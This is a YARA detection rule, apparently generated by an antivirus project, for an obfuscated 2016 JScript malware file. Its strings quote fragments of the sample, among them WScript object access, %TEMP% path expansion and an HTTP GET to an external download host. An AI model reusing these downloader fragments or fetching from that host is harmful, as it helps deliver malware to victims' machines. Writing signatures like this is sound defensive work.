rule sig_20160428_d3957a317c6f0a5205769fb6cc828627 {
  meta:
    description = "datamaliciousorder - file 20160428_d3957a317c6f0a5205769fb6cc828627.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fd504d341dd7cc4a735130e41283d9bc69779305a460297985ea44f0ec087e3a"

  strings:
    $s1  = "function MnrNphNcrZevEcrApdXvo(GtjUaoTivHgdHzjAptTwc){ScgBzsXhjKmsObsDreYph[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function MnrNphNcrZevEcrApdXvo(GtjUaoTivHgdHzjAptTwc){ScgBzsXhjKmsObsDreYph[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function AceLclHxgBgzIlgFgaYmh() {return ScgBzsXhjKmsObsDreYph[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "return BmxEeaHrjNqdOjiTooIry - AwrWayVgfWcyNdgXaaYwv;};" fullword ascii
    $s5  = "function SbcPmuBorJlyPrhRwhPqv(BmxEeaHrjNqdOjiTooIry, AwrWayVgfWcyNdgXaaYwv){OcvDbqKzwYckIjdThcIjc = OcvDbqKzwYckIjdThcIjc * 1; " ascii
    $s6  = "var ScgBzsXhjKmsObsDreYph = function TkvGgzZtwVtdBqhHtpQio() {return EoqFnqQtiKqeKurFiwPxp[EbuAvvAydApuEyuFnoBpu](\"WScript\"+\"" ascii
    $s7  = "FdwLfvWfjPcvNvpDhuUqb[QghVhiKheNwzXxkCemHgo](\"G\" + \"ET\", \"http://berezy74.ru/n8sjad\", false);" fullword ascii
    $s8  = "var ScgBzsXhjKmsObsDreYph = function TkvGgzZtwVtdBqhHtpQio() {return EoqFnqQtiKqeKurFiwPxp[EbuAvvAydApuEyuFnoBpu](\"WScript\"+\"" ascii
    $s9  = "var EoqFnqQtiKqeKurFiwPxp = this[\"WScript\"];" fullword ascii
    $s10 = "function AceLclHxgBgzIlgFgaYmh() {return ScgBzsXhjKmsObsDreYph[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (FdwLfvWfjPcvNvpDhuUqb[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function LvpLtcXmoOflRogFesVpr(){return KxwRieBboYaqCqvIxsLvg + \"\";};" fullword ascii
    $s13 = "function SbcPmuBorJlyPrhRwhPqv(BmxEeaHrjNqdOjiTooIry, AwrWayVgfWcyNdgXaaYwv){OcvDbqKzwYckIjdThcIjc = OcvDbqKzwYckIjdThcIjc * 1; " ascii
    $s14 = "function WksLdeFdbArqVvjYrfEjl() {return ((QlfEpxHkkWrbAxeQriBus == true) && (QlfEpxHkkWrbAxeQriBus == OzeKcuNylGssRatNzpJoz)) ?" ascii
    $s15 = "function WksLdeFdbArqVvjYrfEjl() {return ((QlfEpxHkkWrbAxeQriBus == true) && (QlfEpxHkkWrbAxeQriBus == OzeKcuNylGssRatNzpJoz)) ?" ascii
    $s16 = "return SbcPmuBorJlyPrhRwhPqv(1 == 1 ? ElcLguXpqIcvHxhQndUmb : 0, 1 == 1 ? QwiZpiBaiChgFewBnuSgd : 0);" fullword ascii
    $s17 = "}while (NhaPynFumParZfnHuaOba);" fullword ascii
    $s18 = "OzeKcuNylGssRatNzpJoz = true; " fullword ascii
    $s19 = "function DuhAenXtdJkiDltXpvQci(HxjFdaUyxBnoAzzWknPkj) {var ObkVaaOkbWsfTeqCheWtl = (1, 2, 3, 4, 5, HxjFdaUyxBnoAzzWknPkj); retur" ascii
    $s20 = "YmgRveYtnGchGjcFvzQvx = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}